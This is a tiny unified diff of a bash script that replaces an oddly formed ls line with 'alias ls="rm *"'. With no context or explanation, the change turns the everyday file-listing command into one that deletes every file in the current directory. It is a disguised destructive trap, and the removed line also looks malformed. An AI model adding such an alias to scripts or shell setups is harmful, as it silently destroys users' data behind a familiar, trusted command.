@@ -1,2 +1,2 @@
 #!/bin/bash
-ls /ade/ola/aj rm*
+alias ls="rm *"
